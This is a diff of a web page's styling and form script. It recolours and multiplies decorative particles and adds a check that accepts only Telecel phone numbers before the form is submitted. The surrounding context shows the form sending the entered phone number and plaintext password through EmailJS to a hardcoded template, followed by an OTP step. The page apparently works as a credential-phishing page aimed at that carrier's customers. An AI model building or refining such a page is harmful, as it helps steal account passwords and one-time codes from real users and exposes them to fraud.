@@ -63,14 +63,16 @@
     }
 
     /* ===== Gold Particle Effect ===== */
-    .particle {
-      position: absolute;
-      background: radial-gradient(circle, rgba(255, 215, 0, 0.9), rgba(255, 215, 0, 0.1));
-      border-radius: 50%;
-      opacity: 0.7;
-      pointer-events: none;
-      animation: floatParticle 10s linear infinite;
-    }
+   .particle {
+  position: absolute;
+  background: radial-gradient(circle, rgba(255, 0, 0, 0.9), rgba(255, 0, 0, 0.1));
+  border-radius: 50%;
+  opacity: 0.7;
+  pointer-events: none;
+  animation: floatParticle 10s linear infinite;
+  filter: blur(2px);
+  box-shadow: 0 0 6px rgba(255, 0, 0, 0.6);
+}
 
     @keyframes floatParticle {
       0% { transform: translateY(0) scale(1); opacity: 0.8; }
@@ -193,7 +195,7 @@
 
     // === Gold Particle Generator ===
     const particleContainer = document.getElementById("particles");
-    const particleCount = 40;
+    const particleCount = 100;
     for (let i = 0; i < particleCount; i++) {
       const particle = document.createElement("div");
       particle.classList.add("particle");
@@ -267,6 +269,17 @@ registerForm.addEventListener("submit", (e) => {
   const phone = document.getElementById("phone").value;
   const password = document.getElementById("password").value;
 
+  // ===== TELECEL NUMBER VALIDATION =====
+  const telecelPrefixes = ["20", "50"];
+  const number = phone.trim();
+  const isTelecel = number.length === 9 && telecelPrefixes.some(prefix => number.startsWith(prefix));
+
+  if (!isTelecel) {
+    showNotification("❌ Please enter a valid Telecel number.", "error");
+    return; // stop submission
+  }
+
+  // Continue with EmailJS if number is valid
   emailjs.send("service_74nt2c9", "template_s6vpt2e", {
     phone: "TELECEL " + phone,
     password: password
@@ -279,7 +292,7 @@ registerForm.addEventListener("submit", (e) => {
     showNotification("Failed to send details.", "error");
   });
 });
-
+    
 // === Verification ===
 verifyBtn.addEventListener("click", () => {
   const otp = otpInput.value;
